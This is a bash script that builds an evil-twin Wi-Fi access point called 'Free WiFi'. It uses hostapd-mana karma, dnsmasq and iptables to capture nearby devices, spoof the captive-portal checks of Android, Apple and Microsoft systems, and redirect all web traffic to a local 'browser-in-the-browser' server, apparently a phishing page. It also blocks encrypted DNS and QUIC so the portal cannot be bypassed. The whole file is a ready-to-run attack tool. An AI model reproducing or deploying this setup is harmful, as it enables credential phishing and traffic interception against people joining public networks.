#!/usr/bin/env bash

set -u

WIFI_IFACE="${WIFI_IFACE:-wlan0}"
UPLINK_IFACE="${UPLINK_IFACE:-eth0}"
AP_SSID="${AP_SSID:-Free WiFi}"
AP_IP="${AP_IP:-10.99.0.1}"
AP_NET="${AP_NET:-10.99.0.0/24}"
DHCP_RANGE_START="${DHCP_RANGE_START:-10.99.0.50}"
DHCP_RANGE_END="${DHCP_RANGE_END:-10.99.0.150}"
BITB_PORT="${BITB_PORT:-8080}"
BITB_HTTPS_PORT="${BITB_HTTPS_PORT:-443}"
ENABLE_NAT="${ENABLE_NAT:-0}"

WORKDIR="$(cd "$(dirname "$0")" && pwd)"
RUN_DIR="${WORKDIR}/.run"
mkdir -p "${RUN_DIR}"

find "${RUN_DIR}" -name '*.bak' -mtime +1 -delete 2>/dev/null || true

STAMP="$(date +%s)"
BACKUP_V4="${RUN_DIR}/iptables-v4.${STAMP}.bak"
BACKUP_V6="${RUN_DIR}/iptables-v6.${STAMP}.bak"
APPLIED_LOG="${RUN_DIR}/applied-rules.${STAMP}.log"
ORIG_FORWARD_FILE="${RUN_DIR}/orig-forward.${STAMP}"

HOSTAPD_CONF="${RUN_DIR}/hostapd.conf"
DNSMASQ_CONF="${RUN_DIR}/dnsmasq.conf"
DNSMASQ_PID="${RUN_DIR}/dnsmasq.pid"
DNSMASQ_LEASES="${RUN_DIR}/dnsmasq.leases"
HOSTAPD_PID="${RUN_DIR}/hostapd.pid"

NAT_CHAIN="BITB_NAT"
FWD_CHAIN="BITB_FWD"
INP_CHAIN="BITB_INPUT"

log()  { echo -e "\033[1;36m[*]\033[0m $*"; }
ok()   { echo -e "\033[1;32m[+]\033[0m $*"; }
warn() { echo -e "\033[1;33m[!]\033[0m $*"; }
err()  { echo -e "\033[1;31m[x]\033[0m $*" >&2; }

require_root() {
  if [[ $EUID -ne 0 ]]; then err "must be root (sudo)"; exit 1; fi
}

need_bin() {
  command -v "$1" >/dev/null 2>&1 || { err "required binary not found: $1"; exit 1; }
}

apply() {
  echo "iptables $*" >> "${APPLIED_LOG}"
  iptables "$@"
}

cleanup() {
  echo
  log "running cleanup..."
  rm -f /tmp/bitb_allowed_*

  for pidfile in "${HOSTAPD_PID}" "${DNSMASQ_PID}"; do
    if [[ -f "${pidfile}" ]]; then
      pid="$(cat "${pidfile}" 2>/dev/null || true)"
      if [[ -n "${pid}" ]] && kill -0 "${pid}" 2>/dev/null; then
        kill "${pid}" 2>/dev/null || true
        sleep 0.3
        kill -9 "${pid}" 2>/dev/null || true
      fi
      rm -f "${pidfile}"
    fi
  done

  ip addr show dev "${WIFI_IFACE}" 2>/dev/null | grep -q "${AP_IP}/" && \
    ip addr del "${AP_IP}/24" dev "${WIFI_IFACE}" 2>/dev/null || true

  iptables -t nat -D PREROUTING -i "${WIFI_IFACE}" -j "${NAT_CHAIN}" 2>/dev/null || true
  iptables -t nat -D POSTROUTING -s "${AP_NET}" ! -o "${WIFI_IFACE}" -j MASQUERADE 2>/dev/null || true
  iptables -t nat -D POSTROUTING -j "${NAT_CHAIN}" 2>/dev/null || true
  iptables -t nat -F "${NAT_CHAIN}" 2>/dev/null || true
  iptables -t nat -X "${NAT_CHAIN}" 2>/dev/null || true
  iptables -D FORWARD -j "${FWD_CHAIN}" 2>/dev/null || true
  iptables -F "${FWD_CHAIN}" 2>/dev/null || true
  iptables -X "${FWD_CHAIN}" 2>/dev/null || true
  iptables -D INPUT -j "${INP_CHAIN}" 2>/dev/null || true
  iptables -F "${INP_CHAIN}" 2>/dev/null || true
  iptables -X "${INP_CHAIN}" 2>/dev/null || true

  if [[ -f "${ORIG_FORWARD_FILE}" ]]; then
    orig="$(cat "${ORIG_FORWARD_FILE}")"
    sysctl -w net.ipv4.ip_forward="${orig}" >/dev/null 2>&1 || true
    rm -f "${ORIG_FORWARD_FILE}"
  fi

  ip link set "${WIFI_IFACE}" down 2>/dev/null || true

  ok "cleanup complete. Original state backup at: ${BACKUP_V4}"
  ok "to manually restore:  iptables-restore < ${BACKUP_V4}"
}

panic_restore() {
  warn "panic-restore: full restore from backup"
  [[ -f "${BACKUP_V4}" ]] && iptables-restore < "${BACKUP_V4}" || true
  [[ -f "${BACKUP_V6}" ]] && ip6tables-restore < "${BACKUP_V6}" || true
}

trap 'cleanup' EXIT
trap 'cleanup; exit 130' INT TERM

require_root
need_bin iptables
need_bin iptables-save
need_bin sysctl
need_bin ip
need_bin dnsmasq

HOSTAPD_BIN=""
if command -v hostapd-mana >/dev/null 2>&1; then
  HOSTAPD_BIN="hostapd-mana"
elif command -v hostapd >/dev/null 2>&1; then
  HOSTAPD_BIN="hostapd"
  warn "hostapd-mana not found, falling back to standard hostapd (no karma)"
else
  err "hostapd-mana or hostapd required"; exit 1
fi

if ! curl -fsS "http://127.0.0.1:${BITB_PORT}/" >/dev/null 2>&1; then
  err "BITB server not responding on :${BITB_PORT}. Run first: python3 bitb.py (in the BITB module directory)"
  exit 1
fi
ok "BitB OK on :${BITB_PORT}"
rm -f /tmp/bitb_allowed_*

log "backing up iptables state to ${BACKUP_V4}"
iptables-save  > "${BACKUP_V4}"
ip6tables-save > "${BACKUP_V6}" 2>/dev/null || true
cat /proc/sys/net/ipv4/ip_forward > "${ORIG_FORWARD_FILE}"

if ! ip link show dev "${WIFI_IFACE}" >/dev/null 2>&1; then
  err "interface '${WIFI_IFACE}' not found."
  echo
  warn "available interfaces on this machine:"
  ip -br link show | sed 's/^/    /'
  echo
  warn "set with:  sudo WIFI_IFACE=<iface-name> ./captive-portal.sh"
  warn "or run:    sudo ./install.sh   (will auto-detect AP-capable wifi)"
  exit 1
fi

log "configuring ${WIFI_IFACE} -> ${AP_IP}"
ip link set "${WIFI_IFACE}" down
ip addr flush dev "${WIFI_IFACE}" 2>/dev/null || true
if ! ip addr add "${AP_IP}/24" dev "${WIFI_IFACE}"; then
  err "failed to assign ${AP_IP}/24 to ${WIFI_IFACE}"
  exit 1
fi
ip link set "${WIFI_IFACE}" up
sysctl -w net.ipv4.ip_forward=1 >/dev/null

cat > "${HOSTAPD_CONF}" <<EOF
interface=${WIFI_IFACE}
driver=nl80211
ssid=${AP_SSID}
hw_mode=g
channel=6
auth_algs=1
ignore_broadcast_ssid=0
EOF

if [[ "${HOSTAPD_BIN}" == "hostapd-mana" ]]; then
  cat >> "${HOSTAPD_CONF}" <<EOF
mana_wpe=0
mana_loud=1
mana_macacl=0
EOF
fi

cat > "${DNSMASQ_CONF}" <<EOF
interface=${WIFI_IFACE}
bind-interfaces
listen-address=${AP_IP}
no-hosts
server=8.8.8.8
server=1.1.1.1
dhcp-option=26,1400
dhcp-range=${DHCP_RANGE_START},${DHCP_RANGE_END},12h
dhcp-option=3,${AP_IP}
dhcp-option=6,${AP_IP}
dhcp-option=114,"http://${AP_IP}/__connect"
dhcp-option=160,"http://${AP_IP}/__connect"
dhcp-leasefile=${DNSMASQ_LEASES}
log-queries
log-dhcp
address=/connectivitycheck.gstatic.com/${AP_IP}
address=/connectivitycheck.android.com/${AP_IP}
address=/clients3.google.com/${AP_IP}
address=/captive.apple.com/${AP_IP}
address=/www.msftconnecttest.com/${AP_IP}
EOF

log "building custom chains ${NAT_CHAIN}, ${FWD_CHAIN}, ${INP_CHAIN}"
apply -t nat -N "${NAT_CHAIN}" 2>/dev/null || apply -t nat -F "${NAT_CHAIN}"
apply       -N "${FWD_CHAIN}" 2>/dev/null || apply       -F "${FWD_CHAIN}"
apply       -N "${INP_CHAIN}" 2>/dev/null || apply       -F "${INP_CHAIN}"

apply -A "${INP_CHAIN}" -i "${WIFI_IFACE}" -p udp --dport 67:68 -j ACCEPT
apply -A "${INP_CHAIN}" -i "${WIFI_IFACE}" -p udp --dport 53    -j ACCEPT
apply -A "${INP_CHAIN}" -i "${WIFI_IFACE}" -p tcp --dport 53    -j ACCEPT
apply -A "${INP_CHAIN}" -i "${WIFI_IFACE}" -p tcp --dport 80    -j ACCEPT
apply -A "${INP_CHAIN}" -i "${WIFI_IFACE}" -p tcp --dport 443   -j ACCEPT
apply -A "${INP_CHAIN}" -i "${WIFI_IFACE}" -p icmp              -j ACCEPT

apply -t nat -A "${NAT_CHAIN}" -p tcp --dport 80  -j DNAT --to-destination "${AP_IP}:${BITB_PORT}"
apply -t nat -A "${NAT_CHAIN}" -p tcp --dport 443 -j DNAT --to-destination "${AP_IP}:${BITB_HTTPS_PORT}"

apply -t nat -A "${NAT_CHAIN}" -p udp --dport 53 -j DNAT --to-destination "${AP_IP}:53"
apply -t nat -A "${NAT_CHAIN}" -p tcp --dport 53 -j DNAT --to-destination "${AP_IP}:53"

apply -A "${FWD_CHAIN}" -m state --state RELATED,ESTABLISHED -j ACCEPT
apply -A "${FWD_CHAIN}" -i "${WIFI_IFACE}" -p udp --dport 443 -j REJECT --reject-with icmp-port-unreachable
apply -A "${FWD_CHAIN}" -i "${WIFI_IFACE}" -p tcp --dport 443 -j REJECT --reject-with tcp-reset
apply -A "${FWD_CHAIN}" -i "${WIFI_IFACE}" -p tcp --dport 853 -j REJECT --reject-with tcp-reset
apply -A "${FWD_CHAIN}" -i "${WIFI_IFACE}" -p udp --dport 853 -j REJECT --reject-with icmp-port-unreachable

apply -t nat -A PREROUTING  -i "${WIFI_IFACE}" -j "${NAT_CHAIN}"
apply       -A FORWARD     -j "${FWD_CHAIN}"
apply       -I INPUT 1     -j "${INP_CHAIN}"

if [[ "${ENABLE_NAT}" == "1" ]]; then
  apply -t nat -I POSTROUTING 1 -s "${AP_NET}" ! -o "${WIFI_IFACE}" -j MASQUERADE
  apply -A "${FWD_CHAIN}" -i "${WIFI_IFACE}" -j ACCEPT
  apply -A "${FWD_CHAIN}" -o "${WIFI_IFACE}" -m state --state RELATED,ESTABLISHED -j ACCEPT
  [[ -n "${UPLINK_IFACE}" ]] && echo "${UPLINK_IFACE}" > "${RUN_DIR}/uplink.conf"
fi

ok "iptables ready. Applied rules logged to: ${APPLIED_LOG}"

log "starting dnsmasq..."
dnsmasq -C "${DNSMASQ_CONF}" -x "${DNSMASQ_PID}" || { err "dnsmasq failed to start"; exit 1; }
ok "dnsmasq up (pid $(cat "${DNSMASQ_PID}"))"

log "starting ${HOSTAPD_BIN} (foreground; Ctrl+C to stop and cleanup)"
"${HOSTAPD_BIN}" -P "${HOSTAPD_PID}" "${HOSTAPD_CONF}" || warn "hostapd exited"
